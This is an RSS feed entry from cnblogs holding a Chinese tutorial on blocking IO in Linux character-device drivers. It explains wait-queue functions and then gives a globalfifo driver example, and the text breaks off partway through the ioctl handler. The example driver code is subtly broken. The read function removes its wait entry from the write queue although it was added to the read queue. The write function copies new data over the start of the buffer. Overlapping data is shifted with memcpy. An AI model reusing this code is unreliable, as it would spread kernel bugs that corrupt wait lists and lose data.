{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "linux设备驱动阻塞IO应用",
      "link": "https://www.cnblogs.com/cear/p/19617828",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/cear/p/19617828\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 09:51\">\n    <span>linux设备驱动阻塞IO应用</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        使用wait_queue_head_t实现阻塞上层应用\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<h2>1. 驱动中阻塞相关函数的基础</h2>\n<h3>1.1 wait_queue_head_t</h3>\n<p>定义等待队列头</p>\n<div class=\"cnblogs_code\">\n<pre>#include &lt;linux/wait.h&gt;\n<span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\">\n * lock：自旋锁，用于保护队列操作（如添加/删除等待项）的并发安全\n * head：链表头，指向等待队列项的链表\n </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\ntypedef </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> wait_queue_head {\n    spinlock_t      </span><span style=\"color: rgba(0, 0, 255, 1);\">lock</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> list_head    head;\n} wait_queue_head_t;</span></pre>\n</div>\n<h3>1.2 init_waitqueue_head</h3>\n<p>初始化一个已经分配了内存的等待队列头，设置其自旋锁和链表为空</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> init_waitqueue_head(wait_queue_head_t *q);</pre>\n</div>\n<h3>1.3 DECLARE_WAITQUEUE</h3>\n<p><strong>静态声明并初始化一个等待队列项（wait queue entry）</strong>。该宏创建一个&nbsp;<span class=\"cnblogs_code\">wait_queue_entry</span>&nbsp;类型的变量，并将指定的进程描述符&nbsp;<span class=\"cnblogs_code\">tsk</span>&nbsp;（当前进程为 <span class=\"cnblogs_code\">current</span>&nbsp;）与该队列项关联，同时设置默认的唤醒函数</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 0, 1);\">DECLARE_WAITQUEUE(name, tsk);\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 使用方式</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">DECLARE_WAITQUEUE(wait, current);\n</span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 展开后为</span>\nwait_queue_entry_t wait =<span style=\"color: rgba(0, 0, 0, 1);\"> {\n    .</span><span style=\"color: rgba(0, 0, 255, 1);\">private</span>    = current,                 <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 指向等待的进程 task_struct</span>\n    .func       = default_wake_function,   <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 唤醒时调用的函数</span>\n    .task_list  = { NULL, NULL }           <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 链表节点，用于挂入等待队列头</span>\n};</pre>\n</div>\n<h3>1.4 add_wait_queue</h3>\n<p>将一个已经初始化好的等待队列项&nbsp;<span class=\"cnblogs_code\">wait</span>&nbsp;添加到等待队列头&nbsp;<span class=\"cnblogs_code\">queue</span>&nbsp;所管理的队列中。添加后，该队列项就成为了等待队列的一部分</p>\n<p>在进程准备睡眠之前，先将自己添加到等待队列，这样其他唤醒者才能找到它</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> add_wait_queue(wait_queue_head_t *queue, wait_queue_t *wait);</pre>\n</div>\n<h3>1.5 set_current_state</h3>\n<p class=\"ds-markdown-paragraph\"><strong>设置当前进程的状态</strong>，将&nbsp;<span class=\"cnblogs_code\">current-&gt;state</span>&nbsp;赋值为&nbsp;<span class=\"cnblogs_code\">new_state</span>&nbsp;<code>，</code>进程状态定义在&nbsp;<span class=\"cnblogs_code\">&lt;linux/sched.h&gt;</span>&nbsp;中，常见的有：</p>\n<ul>\n<li>\n<p class=\"ds-markdown-paragraph\"><code>TASK_RUNNING</code>：可运行状态（正在运行或就绪）。</p>\n</li>\n<li>\n<p class=\"ds-markdown-paragraph\"><code>TASK_INTERRUPTIBLE</code>：可中断的睡眠状态，可以被信号唤醒。</p>\n</li>\n<li>\n<p class=\"ds-markdown-paragraph\"><code>TASK_UNINTERRUPTIBLE</code>：不可中断的睡眠状态，只能由显式唤醒解除。</p>\n</li>\n</ul>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> set_current_state(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> new_state);        <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 有内存屏障，保证顺序</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">void</span> __set_current_state(<span style=\"color: rgba(0, 0, 255, 1);\">int</span> new_state);      <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 没有内存屏障    </span></pre>\n</div>\n<h3>1.6 <code>remove_wait_queue</code></h3>\n<p>将之前通过&nbsp;<span class=\"cnblogs_code\">add_wait_queue</span>&nbsp;添加的等待队列项从等待队列中移除；当进程被唤醒并重新获得 CPU 后，通常需要调用此函数将自己从等待队列中删除，表示不再等待该条件；如果忘记移除，队列项仍留在等待队列中，可能导致后续不必要的唤醒或资源泄漏</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> remove_wait_queue(wait_queue_head_t *queue, wait_queue_t *wait);</pre>\n</div>\n<h3>1.7 <code>wake_up</code></h3>\n<p>唤醒队列中所有进程（包括 <span class=\"cnblogs_code\">TASK_UNINTERRUPTIBLE</span>和&nbsp;<span class=\"cnblogs_code\">TASK_INTERRUPTIBLE</span>&nbsp;）</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> wake_up(wait_queue_head_t *queue);</pre>\n</div>\n<p>唤醒等待队列&nbsp;<span class=\"cnblogs_code\">queue</span>&nbsp;中所有状态为&nbsp;<span class=\"cnblogs_code\">TASK_INTERRUPTIBLE</span>&nbsp;的进程。这些进程将被设置为&nbsp;<span class=\"cnblogs_code\">TASK_RUNNING</span>&nbsp;并移入运行队列，等待调度器选择它们运行</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">void</span> wake_up_interruptible(wait_queue_head_t *queue);</pre>\n</div>\n<h2>2. 阻塞驱动使用例子</h2>\n<div class=\"cnblogs_code\">\n<pre>#include &lt;linux/init.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/errno.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/mm.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/sched.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/module.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/ioctl.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/io.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/fs.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/cdev.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/uaccess.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/slab.h&gt;<span style=\"color: rgba(0, 0, 0, 1);\">\n#include </span>&lt;linux/wait.h&gt;\n\n<span style=\"color: rgba(0, 0, 255, 1);\">#define</span> GLOBALFIFO_SIZE    1024\n<span style=\"color: rgba(0, 0, 255, 1);\">#define</span> GLOBALMEM_MAGIC    'M'\n<span style=\"color: rgba(0, 0, 255, 1);\">#define</span> MEM_CLEAR        _IO(GLOBALMEM_MAGIC, 0)\n\n<span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_dev {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span> cdev m_cdev;            <span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 字符设备 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\n    unsigned </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span> current_len;        <span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> fifo有效数据长度 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\n    unsigned </span><span style=\"color: rgba(0, 0, 255, 1);\">char</span> mem[GLOBALFIFO_SIZE];    <span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 全局内存 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">struct</span> semaphore sem;            <span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 并发控制信号量 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\n    wait_queue_head_t r_wait;        </span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 阻塞读等待队列头 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\n    wait_queue_head_t w_wait;        </span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 阻塞写等待队列头 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span><span style=\"color: rgba(0, 0, 0, 1);\">\n};\n\n\n</span><span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">int</span> globalfifo_major = <span style=\"color: rgba(128, 0, 128, 1);\">266</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 存放字符设备私有数据</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> globalfifo_dev*<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_devp;\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user open fd </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">int</span> globalfifo_open(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> inode* inode, <span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file*<span style=\"color: rgba(0, 0, 0, 1);\"> filp) {\n    \n    </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span> globalfifo_dev*<span style=\"color: rgba(0, 0, 0, 1);\"> dev;\n    dev </span>= container_of(inode-&gt;i_cdev, <span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_dev, m_cdev);\n    filp</span>-&gt;private_data =<span style=\"color: rgba(0, 0, 0, 1);\"> dev;\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n}\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user release fd</span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">int</span> globalfifo_release(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> inode* inode, <span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file*<span style=\"color: rgba(0, 0, 0, 1);\"> filp) {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n}\n\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user read fd </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> ssize_t globalfifo_read(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file* filp, <span style=\"color: rgba(0, 0, 255, 1);\">char</span> __user* buf, size_t count, loff_t*<span style=\"color: rgba(0, 0, 0, 1);\"> ppos) {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;    \n    </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span> globalfifo_dev* dev = filp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">private_data;    \n    \n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 定义等待队列</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">    DECLARE_WAITQUEUE(wait, current);    \n\n    down(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 1.将等待队列加入到等待队列头</span>\n    add_wait_queue(&amp;dev-&gt;r_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 2.循环检查等待条件（防止假唤醒，如果唤醒后不满足条件会再次睡眠）</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">while</span> (dev-&gt;current_len == <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">) {\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 3. 检查非阻塞模式直接返回</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">if</span> (filp-&gt;f_flags &amp;<span style=\"color: rgba(0, 0, 0, 1);\"> O_NONBLOCK) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EAGAIN;\n            up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n            remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n            set_current_state(TASK_RUNNING);\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n        }\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 4.改变进程状态为可中断睡眠</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">        __set_current_state(TASK_INTERRUPTIBLE);\n\n        up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 5.调度其他进程执行（真正睡眠）        </span>\n<span style=\"color: rgba(0, 0, 0, 1);\">        schedule();\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 6.检查如果有信号到达返回上层处理错误（自己的唤醒只将状态转换为TASK_RUNNING，但信号到来也会做这个处理）</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">if</span><span style=\"color: rgba(0, 0, 0, 1);\"> (signal_pending(current)) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">ERESTARTSYS;\n            remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n            set_current_state(TASK_RUNNING);\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n        }\n        \n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 被唤醒后的处理</span>\n        down(&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n    }\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>(count &gt; dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">current_len)\n        count </span>= dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">current_len;\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>(copy_to_user(buf, dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">mem, count)) {\n        ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EFAULT;\n        up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n        remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n           set_current_state(TASK_RUNNING);\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n    } </span><span style=\"color: rgba(0, 0, 255, 1);\">else</span><span style=\"color: rgba(0, 0, 0, 1);\"> {\n        memcpy(dev</span>-&gt;mem, dev-&gt;mem + count, dev-&gt;current_len -<span style=\"color: rgba(0, 0, 0, 1);\"> count);\n        dev</span>-&gt;current_len -=<span style=\"color: rgba(0, 0, 0, 1);\"> count;\n            \n        wake_up_interruptible(</span>&amp;dev-&gt;w_wait);    <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 读出数据后唤醒写进程</span>\n        ret =<span style=\"color: rgba(0, 0, 0, 1);\"> count;\n    }\n    \n    up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n    remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n    set_current_state(TASK_RUNNING);\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n}\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user write fd </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span> \n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> ssize_t globalfifo_write(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file* filp, <span style=\"color: rgba(0, 0, 255, 1);\">const</span> <span style=\"color: rgba(0, 0, 255, 1);\">char</span> __user* buf, size_t count, loff_t*<span style=\"color: rgba(0, 0, 0, 1);\"> ppos) {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;    \n    </span><span style=\"color: rgba(0, 0, 255, 1);\">struct</span> globalfifo_dev* dev = filp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">private_data;    \n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 定义等待队列</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">    DECLARE_WAITQUEUE(wait, current);\n    down(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 1.将等待队列插入写等待队列头</span>\n    add_wait_queue(&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 2.循环等待 若FIFO满则应该挂起</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">while</span> (dev-&gt;current_len ==<span style=\"color: rgba(0, 0, 0, 1);\"> GLOBALFIFO_SIZE) {\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 3. 若非阻塞则直接返回</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">if</span> (filp-&gt;f_flags &amp;<span style=\"color: rgba(0, 0, 0, 1);\"> O_NONBLOCK) {\n            up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EAGAIN;\n            remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n            set_current_state(TASK_RUNNING);\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n        }\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 4.将进程状态改为可打断睡眠</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">        __set_current_state(TASK_INTERRUPTIBLE);\n        up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 5.调度其他进程（真正睡眠）</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">        schedule();\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 6.若因为信号唤醒，则返回让上层完成错误处理</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">if</span><span style=\"color: rgba(0, 0, 0, 1);\"> (signal_pending(current)) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">ERESTARTSYS;\n            remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n            set_current_state(TASK_RUNNING);\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n        }\n        down(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n    }\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span> (count &gt; GLOBALFIFO_SIZE - dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">current_len)\n        count </span>= GLOBALFIFO_SIZE - dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">current_len;\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span> (copy_from_user(dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">mem, buf, count)) {\n        ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EFAULT;\n        up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n        remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n        set_current_state(TASK_RUNNING);\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n    } </span><span style=\"color: rgba(0, 0, 255, 1);\">else</span><span style=\"color: rgba(0, 0, 0, 1);\"> {\n        dev</span>-&gt;current_len +=<span style=\"color: rgba(0, 0, 0, 1);\"> count;\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 唤醒等待队列</span>\n        wake_up_interruptible(&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">r_wait);\n        ret </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> count;    \n    }\n\n    up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n    remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n    set_current_state(TASK_RUNNING);\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> count;\n}\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user lseek fd </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> loff_t globalfifo_llseek(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file* filp, loff_t offset, <span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\"> orig) {\n    loff_t ret;\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">switch</span><span style=\"color: rgba(0, 0, 0, 1);\">(orig) {\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 从起始位置开始移动指针</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">case</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">:\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>(offset &lt; <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n        }\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>((unsigned <span style=\"color: rgba(0, 0, 255, 1);\">int</span>)offset &gt;<span style=\"color: rgba(0, 0, 0, 1);\"> GLOBALFIFO_SIZE) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n        }\n        filp</span>-&gt;f_pos = (unsigned <span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\">)offset;\n        ret </span>= filp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">f_pos;\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 从当前位置开始移动指针</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">case</span> <span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">:\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>((filp-&gt;f_pos + offset) &gt;<span style=\"color: rgba(0, 0, 0, 1);\"> GLOBALFIFO_SIZE) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n        }\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>((filp-&gt;f_pos + offset) &lt; <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n        }\n        filp</span>-&gt;f_pos +=<span style=\"color: rgba(0, 0, 0, 1);\"> offset;\n        ret </span>= filp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">f_pos;\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">default</span><span style=\"color: rgba(0, 0, 0, 1);\">:\n        ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n    }\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n}\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user ioctl fd </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">long</span> globalfifo_unlocked_ioctl(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file *filp, unsigned <span style=\"color: rgba(0, 0, 255, 1);\">int</span> cmd, unsigned <span style=\"color: rgba(0, 0, 255, 1);\">long</span><span style=\"color: rgba(0, 0, 0, 1);\"> arg){\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 获取设备结构体指针    </span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">struct</span> globalfifo_dev* dev = filp-&gt;<span 